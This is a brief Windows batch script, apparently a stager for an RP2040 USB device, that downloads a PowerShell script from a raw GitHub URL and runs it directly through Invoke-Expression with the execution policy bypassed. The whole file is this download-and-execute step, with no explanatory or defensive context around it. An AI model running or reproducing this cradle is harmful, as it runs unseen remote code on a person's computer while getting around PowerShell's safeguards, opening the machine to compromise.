@echo off
set "URL=https://raw.githubusercontent.com/ZDStudios/RP2040-USB/refs/heads/main/code.ps1"

powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-Expression (Invoke-RestMethod -Uri '%URL%')"